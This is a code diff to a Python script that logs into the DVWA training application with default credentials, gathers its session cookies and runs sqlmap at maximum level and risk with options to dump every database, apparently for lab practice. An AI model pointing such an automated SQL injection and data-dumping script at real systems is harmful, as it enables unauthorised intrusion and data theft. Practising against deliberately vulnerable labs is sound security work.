@@ -11,8 +11,8 @@ sqli_url = base_url + "vulnerabilities/sqli/?id=1&Submit=Submit"
 dvwa_username = "admin"
 dvwa_password = "password"
 
-# Function to login to DVWA and retrieve session ID
-def get_session_id():
+# Function to login to DVWA and retrieve session ID and cookies
+def get_session_cookies():
     with requests.Session() as session:
         # Get initial login page to retrieve the user_token
         response = session.get(login_url)
@@ -29,33 +29,34 @@ def get_session_id():
 
         # Perform login
         post_response = session.post(login_url, data=payload)
-        
-        # Retrieve PHPSESSID from cookies
-        session_id = session.cookies.get('PHPSESSID')
 
         # Check if login was successful
         if "Welcome to Damn Vulnerable Web Application" in post_response.text:
-            print("Login successful. Session ID:", session_id)
+            print("Login successful.")
+            cookies = session.cookies.get_dict()
+            return cookies
         else:
             print("Login failed. Check your credentials and DVWA configuration.")
-            session_id = None
-        
-        return session_id
+            return None
 
 # Running SQLMap to detect SQL injection
-def run_sqlmap(target_url, session_id):
-    if session_id:
+def run_sqlmap(target_url, cookies):
+    if cookies:
+        # Prepare cookies string for SQLMap
+        cookie_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
+        cookie_string += "; security=low"  # Add security level
+        
         # More aggressive SQLMap options for full-fledged SQL injection testing
         sqlmap_command = (
             f"sqlmap -u \"{target_url}\" "
-            f"--cookie=\"PHPSESSID={session_id}\\; security=low\" "
+            f"--cookie=\"{cookie_string}\" "
             "--batch --level=5 --risk=3 --dbs --tables --columns --dump-all --random-agent --threads=5"
         )
         print(f"Running SQLMap with command: {sqlmap_command}")
         os.system(sqlmap_command)
     else:
-        print("No valid session ID. SQLMap will not run.")
+        print("No valid session cookies. SQLMap will not run.")
 
 if __name__ == "__main__":
-    session_id = get_session_id()
-    run_sqlmap(sqli_url, session_id)
+    cookies = get_session_cookies()
+    run_sqlmap(sqli_url, cookies)
